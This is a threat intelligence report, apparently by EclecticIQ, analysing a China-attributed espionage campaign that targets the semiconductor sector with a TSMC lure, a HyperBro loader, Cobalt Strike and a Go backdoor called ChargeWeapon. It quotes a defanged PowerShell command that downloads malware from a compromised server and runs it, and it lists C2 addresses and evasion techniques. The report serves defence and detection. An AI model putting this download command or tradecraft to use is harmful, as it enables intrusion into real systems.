EclecticIQ analysts identified a cyber espionage campaign where threat actors used a
variant of HyperBro loader with a Taiwan Semiconductor Manufacturing (TSMC) lure. This
was likely to target the semiconductor industry in Mandarin/Chinese speaking East Asian
regions (Taiwan, Hong Kong, Singapore).

Executive Summary 

 
EclecticIQ analysts identified a cyber espionage campaign where threat actors used a
variant of HyperBro loader with a Taiwan Semiconductor Manufacturing (TSMC) lure, likely to
target the semiconductor industry in Mandarin/Chinese speaking East Asian regions (Taiwan,
Hong Kong, Singapore). Operational tactics, techniques, and procedures (TTPs) overlap with
previously reported activities attributed to People's Republic of China (PRC) backed cyber
espionage group. 

The HyperBro loader variant leverages a digitally signed CyberArk binary for DLL-Side
loading, resulting in in-memory execution of a Cobalt Strike beacon. [1] Pivoting the beacon,
EclecticIQ analysts identified a previously undocumented malware downloader. This
downloader utilizes the BitsTransfer module in PowerShell to fetch malicious binaries from a
very likely compromised Cobra DocGuard server.  

The malware downloader employs a DLL Side-Loading technique by using a signed McAfee
binary, mcods.exe, to run the Cobalt Strike shellcode. Analysts identified that the shellcode
used the same Cobalt Strike C2 server associated with the HyperBro loader variant. 

The compromised Cobra DocGuard web server hosted a GO-based backdoor that EclecticIQ
tracks as “ChargeWeapon”. The backdoor was very likely uploaded by the same threat actor
on August 21, 2023 [2]. ChargeWeapon is designed to get remote access and send device
and network information from an infected host to an attacker controlled C2 server.

HyperBro Loader Utilizing DLL Side-Loading to Execute Cobalt
Strike Beacon    
EclecticIQ analysts discovered that a threat actor used the variant of HyperBro loader for in-
memory execution of Cobalt Strike beacon by leveraging a legitimated and digitally signed
binary from CyberArk’s vfhost.exe. Cobalt Strike is a commercial adversary simulation
software that is marketed to Red Teams but is also stolen and actively used by a wide range
of threat actors from ransomware operators to espionage-focused Advanced Persistent
Threats (APTs).

masqueraded as ZIP file.

DLL side-loading attacks use the DLL search order mechanism in Windows to plant and
invoke a legitimate application that executes a malicious DLL payload. Threat actors
commonly use this technique for persistence and defense evasion. 

After successful execution of the HyperBro loader variant (VFTRACE.dll), the DLL decrypts
bin.config that contains XOR encrypted Cobalt Strike shellcode. The shellcode loads into
vfhost.exe.Notably, malicious files were written into C:\ProgramData and VFTRACE.dll
contains  thePDB file path: C:\Users\xdd\Desktop\今天\0.直接装载
\VFTRACE\Release\VFTRACE.pdb. 

Figure 3 – DLL Side loading of HyperBro 
loader variant (VFTRACE.dll).  

The shellcode decryption routine uses a one-byte length key (0x01) to decrypt the XOR-
encrypted Cobalt Strike payload. The same routine was used in older versions of HyperBro
loader.[3] This technique was used for evasion of signature-based malware detection. The
obfuscation is rather simple, yet it creates low entropy due to the one-byte key, which means
low detection rate against anti malware scanners.

Figure 4 – Disassembled HyperBro loader variant 
VFTRACE.dll and XOR decryption routine.  

EclecticIQ analysts extracted the command-and-control IP address 38[.]54[.]119[.]239 from
the Cobalt Strike shellcode. Analysis showed that the threat actor used a Malleable
command and control (Malleable C2) profile to disguise itself as jQuery CDN. A Malleable C2
profile specifies how the beacon will transform and store data in a transaction to its C2
server. This technique is used for evasion of traditional firewall defenses [4].

Cobalt Strike shellcode.

The threat actor used a TSMC-themed PDF as a decoy, displayed after the execution of the
HyperBro loader. The lure is written in traditional Mandarin, which is spoken in Hong Kong
and Taiwan, possibly indicating an intention to target non-mainland Chinese speakers. This
social engineering tactic is used to mislead the victim. By presenting a normal looking PDF
while covertly running malware in the background, the chances of the victim growing
suspicious are minimized.

“Taiwan Semiconductor Manufacturing”.  

Compromised Cobra DocGuard Web Server Abused for Second
Stage Malware Delivery 

EclecticIQ analysts identified an undocumented malware downloader that was used by the
threat actor to deploy Cobalt Strike shellcode. After successful infection, it downloads the
encrypted Cobalt Strike shellcode bin.config , McAfee binary mcods.exe and a generic
loader mcvsocfg.dll from a very likely compromised Cobra DocGuard web server at
154[.]93[.]7[.]99. Cobra DocGuard is a software developed by a Chinese company called
EsafeNet and used to protect, encrypt, and decrypt software or files. The downloaded
binaries were used to decrypt and execute Cobalt Strike shellcode via DLL Side loading
technique.  

8/20



The Cobalt Strike beacon uses the same C2 address 38[.]54[.]119[.]239 that was detected in
the HyperBro loader variant. Analysts assess with high confidence that the malware
downloader was likely used by the same threat actor because it uses the same C2 server IP
with the same Malleable C2 profile. In addition, the HyperBro loader variant and the malware
downloader were uploaded to Virus Total in August 2023, within 13 days of each other [5]
[6]. 

 
  
 

Figure 7 – Malware downloader uses the same C2 
server seen in HyperBro loader.  

 
E xcept for the downloading phase, this malware's Kill-Chain is very similar to that of
HyperBro's. It differs in the routine to decrypt the Cobalt Strike shellcode, and how it loads
the shellcode via Windows NTAPI undocumented functions to increase anti malware
evasion.  

9/20



Figure 8 – Overlaps between HyperBro loader 
variant and new malware downloader.

The code snippet below shows the PowerShell command line execution after the successful
infection of the Cobalt Strike downloader:  

 

Start-BitsTransfer -Source
"hxxp[://]154[.]93[.]7[.]99:8090/CDGServer3/images/zh/mcvsocfg[.]dll" -Destination
"c:\programdata\mcvsocfg[.]dll";Start-BitsTransfer -Source
"hxxp[://]154[.]93[.]7[.]99:8090/CDGServer3/images/zh/mcods[.]exe" -Destination
"c:\programdata\mcods[.]exe";Start-BitsTransfer -Source
"hxxp[://]154[.]93[.]7[.]99:8090/CDGServer3/images/zh/bin[.]config" -Destination
"c:\programdata\bin[.]config";start c:\programdata\mcods[.]exe 

The PowerShell was based64 encoded. It downloads malware artifacts and drops them
under c:\programdata of the infected device. The threat actor used bin.conifg to store
encrypted Cobalt Strike shellcode. Other malware artifacts like mcods.exe and mcvsocfg.dll
were used for decryption of Cobalt Strike shellcode and loading it via DLL side loading
technique.

ChargeWeapon – GO Language Based Backdoor   

EclecticIQ analysts identified a new GO based backdoor that was uploaded on August 21,
2023, to the Cobra DocGuard web server 154[.]93[.]7[.]99 - likely by the same threat actor.
EclecticIQ analysts named the backdoor “ChargeWeapon" because of a string found in the
malware code. 

The file path C:/Users/xll is almost identical to the PDB path C:\Users\xdd\ found in the
HyperBro loader variant (see Figure 3). EclecticIQ analysts assess with high confidence that
the attacker´s file path string D:/yuan/ was written into the GO binary during compilation.
  

11/20



 

Figure 10 – ChargeWeapon string inside the 
GO based malware. 

Upon infection, ChargeWeapon begins transmitting data about the compromised host.
Transmitted data is sent in JSON format and obfuscated by base64 encoding.
ChargeWeapon employs a POST request for command-and-control communication over
45[.]77[.]37[.]145:8443. A breakdown of the extracted data can be seen below: 

Hostname 
IP address (Ipv4 and Ipv6 format)
Process tree 

This information is very likely collected by threat actor to perform initial reconnaissance
against infected hosts and identifying high-value targets.  

ChargeWeapon uses the open-source obfuscation tool called "garble" to perform anti
malware evasion [7]. At the time of this report, only four anti malware solutions have
detected this malware variant in Virus Total.

ChargeWeapon capabilities: 

Interaction with remote device over Windows default command line interface.
Windows Management Instrumentation (WMI) execution.
Base64 obfuscation during C2 connection.
TCP over HTTP C2.
Reading or writing files on infected host. 

The disassembled version of ChargeWeapon shows the IP address of the C2 server and
base64 encoding function when sending data to attacker.

Methods of Operation Strongly Overlaps with People's Republic of
China (PRC) Backed Nation-State Groups 

EclecticIQ analysts assess with high confidence that the analyzed Hyperbro Loader, the
malware downloader and the GO backdoor are very likely operated and developed by a PRC
backed nation state threat actor, due to victimology, infrastructure observed, malware code
and resemblance with previously reported activity clusters.  

In August 2023, Recorded Future reported about a Chinese state-sponsored group dubbed
RedHotel [8]. EclecticIQ's research shares the following similarities with the Recorded
Future's analysis: 

 
The PDB file path found in the HyperBro variants are almost identical.
Use of Cobalt Strike and customized jQuery malleable C2 profile.
The DLL side loading technique via vfhost.exe.
Using hosting providers including AS-CHOOPA (Vultr) and Kaopu Cloud HK for C2
connection. 

In October 2022, a report from Symantec stated that “Budworm has used the endpoint
privilege management software CyberArk Viewfinity to perform side-loading. The binary,
which has the default name vf_host.exe, is usually renamed by the attackers in order to
masquerade as a more innocuous file. Masqueraded names included
securityhealthservice.exe, secu.exe, vfhost.exe, vxhost.exe, vx.exe, and v.exe.” [9] 

According to researchers from Symantec, HyperBro is a malware strain seen in cyberattacks
since 2018. It has been used by APT27 (aka Budworm, LuckyMouse) threat actor to enable
the group to gain full control over targeted systems. HyperBro malware family is often loaded
using a technique known as dynamic-link library (DLL) side-loading. 

EclecticIQ observed the same DLL sideloading technique via the same CyberArk binary.
However, in this new campaign EclecticIQ analysts have not observed any further overlap
with APT27 other than the abuse of DLL side loading through vfhost.exe.   

The malware downloader found in the Cobra DocGuard server was upload to Virus Total
from Hong Kong. In August 22,2023 report from Symantec stated that the Cobra DocGuard
was exploited in a supply chain attacks for targeting organizations in Hong Kong. It is
attributed by Symantec to APT group Carderbee. [10]   

ESET reported that in September 2022, a malicious update to the Cobra DocGuard software
compromised a Hong Kong-based gambling company. The same company was targeted in
September 2021 using a similar method by APT27. Due to this pattern, ESET believes that
the September 2022 breach was also the work of APT27. [11] 

14/20



The exploitation of Cobra DocGuard servers, and using it for malware delivery, overlaps with
reports by Symantec and ESET. This provides further evidence for attribution to People's
Republic of China (PRC) backed nation-state APT groups used similar infrastructure to
target organizations in Hong Kong.  

Detection and Prevention Strategies  
Monitor for DLL side loading activities under C:\ProgramData file path, that use binaries
such as mcods.exe and vfhost.exe on Windows endpoints.    

Use application whitelisting to block execution of any unsigned executable (EXE) from
Windows endpoints and monitor suspicious downloading attempt that use Start-
BitsTransfer PowerShell cmdlet.  

Threat actors are increasingly leveraging Windows PowerShell cmdlets to conduct their
operations. Consider blocking the usage of PowerShell for regular Windows users. If
that is not an option, EclecticIQ researchers highly recommend enabling PowerShell
module and script logging via Windows Group Policy. Also, PowerShell Constrained
Language Mode can be utilized to limit the attack surface of adversaries. 
In this campaign threat actor consistently used same VPS hosting providers such as
AS-CHOOPA (Vultr) and Kaopu Cloud HK to perform their operations. Consider
blocking or monitoring any downloading attempts from this infrastructure.
